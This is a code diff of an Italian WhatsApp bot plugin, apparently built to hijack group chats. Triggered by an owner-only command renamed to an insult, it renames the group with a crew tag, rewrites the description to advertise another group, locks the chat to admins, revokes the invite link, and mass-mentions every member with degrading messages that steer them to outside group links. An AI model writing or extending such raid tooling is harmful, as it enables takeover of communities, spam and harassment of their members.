@@ -1,4 +1,3 @@
-//plugin by the punisher 
 let handler = async (m, { conn, participants, isBotAdmin }) => {
     if (!m.isGroup) return;
 
@@ -9,19 +8,31 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
 
     const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
 
+    // 🔹 CAMBIO NOME GRUPPO
     try {
         let metadata = await conn.groupMetadata(m.chat);
         let oldName = metadata.subject;
-        let newName = `${oldName} | 𝙎𝙑𝙏 𝘽𝙔 𝙏𝙃𝙀 𝙋𝙐𝙉𝙄𝙎𝙃𝙀𝙍 ⁸⁸⁸`;
+        let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀  𝚯𝚩𝚵𝐘𝐑𝚫`;
+
+     // 🔹 CAMBIO DESCRIZIONE GRUPPO 
+        await conn.groupUpdateDescription(
+            m.chat,
+            "ᴏʙᴇʏʀᴀ ᴅᴏᴍɪɴᴀ ᴛᴜᴛᴛᴏ, ᴄɪ ᴛʀᴀsғᴇʀɪᴀᴍᴏ ǫᴜɪ:https://chat.whatsapp.com/G7H11Wc9TyfAHradorlZa1?s=cl&p=a&mlu=3"
+        )
+
+        // 3. Chiude il gruppo (Solo Admin)
+        await conn.groupSettingUpdate(m.chat, 'announcement')
+
         await conn.groupUpdateSubject(m.chat, newName);
     } catch (e) {
         console.error('Errore cambio nome gruppo:', e);
     }
 
+    // 🔹 RESET LINK GRUPPO
     let newInviteLink = '';
     try {
-        await conn.groupRevokeInvite(m.chat);  
-        let code = await conn.groupInviteCode(m.chat); 
+        await conn.groupRevokeInvite(m.chat); // invalida il vecchio link
+        let code = await conn.groupInviteCode(m.chat); // prende il nuovo codice
         newInviteLink = `https://chat.whatsapp.com/${code}`;
     } catch (e) {
         console.error('Errore reset link:', e);
@@ -40,11 +51,11 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     let allJids = participants.map(p => p.jid);
 
     await conn.sendMessage(m.chat, {
-        text: "ɴᴇʟ ꜱɪʟᴇɴᴢɪᴏ ᴅᴇʟ ᴄɪᴇʟᴏ, ᴜɴᴀ ᴠᴏᴄᴇ ᴀɴᴛɪᴄᴀ ᴅᴇᴄʀᴇᴛò ɪʟ ɢɪᴜᴅɪᴢɪᴏ. ʟᴀ ʟᴜᴄᴇ ꜱɪ ꜰᴇᴄᴇ ꜰᴜᴏᴄᴏ, ᴇ ʟᴀ ᴛᴇʀʀᴀ ᴛʀᴇᴍò ꜱᴏᴛᴛᴏ ɪʟ ᴘᴇꜱᴏ ᴅᴇʟʟᴀ ᴄᴏʟᴘᴀ. ᴄᴏꜱì ʟᴀ ᴘᴜɴɪᴢɪᴏɴᴇ ᴅɪᴠɪɴᴀ ᴄᴀᴅᴅᴇ, ɪɴᴇᴠɪᴛᴀʙɪʟᴇ, ꜱᴜ ᴄʜɪ ᴀᴠᴇᴠᴀ ᴏꜱᴀᴛᴏ ꜱꜰɪᴅᴀʀᴇ ʟ’ᴇᴛᴇʀɴᴏ.."
+                text: "𝒍𝒂 𝒗𝒊𝒕𝒂 𝒑𝒖𝒐 𝒔𝒆𝒎𝒃𝒓𝒂𝒓𝒆 𝒅𝒊𝒇𝒇𝒊𝒄𝒊𝒍𝒆 𝒔𝒆𝒏𝒛𝒂 𝒎𝒂𝒏𝒄𝒐 𝒖𝒏 𝒄𝒆𝒏𝒕𝒆𝒔𝒊𝒎𝒐 𝒆 𝒕𝒊 𝒕𝒐𝒄𝒄𝒂 𝒇𝒂𝒓𝒆 𝒍𝒂 𝒕𝒓𝒐𝒊𝒂 𝒑𝒆𝒓 𝒔𝒐𝒍𝒅𝒊,𝒒𝒖𝒊𝒏𝒅𝒊 𝒃𝒓𝒖𝒕𝒕𝒆 𝒕𝒓𝒐𝒊𝒆 𝒍𝒂𝒔𝒄𝒊𝒂𝒕𝒆𝒗𝒊 𝒂𝒏𝒅𝒂𝒓𝒆 𝒏𝒆𝒍 𝒗𝒖𝒐𝒕𝒐 𝒄𝒐𝒎𝒆 𝒑𝒊𝒖𝒎𝒆 "
     });
 
     await conn.sendMessage(m.chat, {
-        text: `ᴍᴀ ᴛʀᴀ ʟᴇ ʀᴏᴠɪɴᴇ ɴᴀᴄQᴜᴇ ᴜɴ ꜱᴜꜱꜱᴜʀʀᴏ ᴅɪ ꜱᴘᴇʀᴀɴᴢᴀ, ᴜɴ ᴄᴀᴍᴍɪɴᴏ ɴᴀꜱᴄᴏꜱᴛᴏ ᴀɢʟɪ ᴏᴄᴄʜɪ ᴅᴇɪ ꜱᴜᴘᴇʀʙɪ. ᴄʜɪ ꜱᴇᴘᴘᴇ ᴄʜɪɴᴀʀᴇ ɪʟ ᴄᴀᴘᴏ ᴇ ʀɪᴄᴏɴᴏꜱᴄᴇʀᴇ ɪ ᴘʀᴏᴘʀɪ ᴇʀʀᴏʀɪ ᴛʀᴏᴠò ᴜɴᴀ ᴠɪᴀ ᴅɪ ʀᴇᴅᴇɴᴢɪᴏɴᴇ. ᴇ ᴄᴏꜱì, ᴘᴇʀꜱɪɴᴏ ꜱᴏᴛᴛᴏ ɪʟ ɢɪᴜᴅɪᴢɪᴏ ᴅɪᴠɪɴᴏ, ꜰᴜ ᴄᴏɴᴄᴇꜱꜱᴀ ᴜɴᴀ ᴘᴏꜱꜱɪʙɪʟɪᴛᴀ ᴅɪ ꜱᴀʟᴠᴇᴢᴢᴀ. ᴄɪ ᴛʀᴀꜱꜰᴇʀɪᴀᴍᴏ ᴛᴜᴛᴛɪ Qᴜᴀ. ⤵️.\n\nhttps://chat.whatsapp.com/L3rCegK3Uox2ZYQN4XpN13?s=cl&p=a&mlu=4&ilr=4\n\nhttps://chat.whatsapp.com/EvnWfXCe9EMCOqdobOCIrj?s=cl&p=a&mlu=4&ilr=4`,
+        text: `𝒔𝒆 𝒗𝒐𝒍𝒆𝒕𝒆 𝒔𝒄𝒂𝒑𝒑𝒂𝒓𝒆 𝒅𝒂 𝒒𝒖𝒆𝒔𝒕𝒐 𝒄𝒊𝒄𝒍𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒐 𝒍𝒂𝒔𝒄𝒊𝒂𝒕𝒆 𝒍𝒂 𝒎𝒂𝒏𝒐 𝒂𝒍𝒍𝒂 𝒑𝒂𝒖𝒓𝒂 𝒆 𝒆𝒏𝒕𝒓𝒂𝒕𝒆 𝒒𝒖𝒊 https://chat.whatsapp.com/IuiL2JAGn4gL1hjylX4TOO?s=cl&p=a&mlu=3`,
         mentions: allJids
     });
 
@@ -56,7 +67,7 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     }
 };
 
-handler.command = ['punisci'];
+handler.command = ['troie'];
 handler.group = true;
 handler.botAdmin = true;
 handler.owner = true;
